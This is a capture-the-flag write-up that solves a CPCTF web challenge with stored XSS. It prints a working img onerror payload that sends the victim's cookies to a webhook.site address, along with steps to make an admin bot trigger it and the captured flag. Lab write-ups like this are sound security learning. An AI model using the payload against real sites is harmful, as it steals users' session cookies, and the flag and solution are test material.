# Let's remove script tag

The bug is exactly what the title suggests: the app only removes literal `<script>...</script>` blocks, but still renders attacker-controlled HTML.

From `dist/blog/server.js`:

```js
function sanitize(html) {
  // Intentionally weak: only removes <script>...</script> blocks
  return html.replace(/<script[\s\S]*?<\/script>/gi, '');
}

app.get('/post/:id', (req, res) => {
  const post = posts.get(req.params.id);
  if (!post) return res.status(404).send('Post not found');

  const safeContent = sanitize(post.content);
  res.send(`<div class="content">${safeContent}</div>`);
});
```

So event handlers such as `onerror`, `onload`, etc. are still valid. This is stored XSS.

The admin bot makes the impact obvious. From `dist/admin/bot.js`:

```js
await page.setCookie({
  name: 'flag',
  value: FLAG,
  domain: hostname,
  path: '/',
  httpOnly: false,
  sameSite: 'Lax',
});
```

The flag is stored in a non-`HttpOnly` cookie on the blog origin, so injected JavaScript can read `document.cookie`.

I used a simple image-beacon payload and exfiltrated to `webhook.site`:

```html
<img src=x onerror="new Image().src='https://webhook.site/36fbec7f-229b-498c-adba-a164a7cc3f71/?c='+encodeURIComponent(document.cookie)">
```

Steps:

1. Create a blog post containing that payload.
2. Submit the post URL to the admin bot.
3. Read the incoming request on `webhook.site`.

On the live deployment I solved, the bot could not open the blog over `https://...` and returned `net::ERR_CONNECTION_REFUSED`, but `http://<instance>.blog.web.cpctf.space/post/...` worked when submitted to the bot. So the admin submission used the `http://` post URL even though I created and inspected the post over `https://`.

The webhook log contained:

```text
c=flag%3DCPCTF%7Bn0t_0nly_5cr1pt_t4g%7D
```

Decoding it gives:

```text
flag=CPCTF{n0t_0nly_5cr1pt_t4g}
```

Flag:

```text
CPCTF{n0t_0nly_5cr1pt_t4g}
```
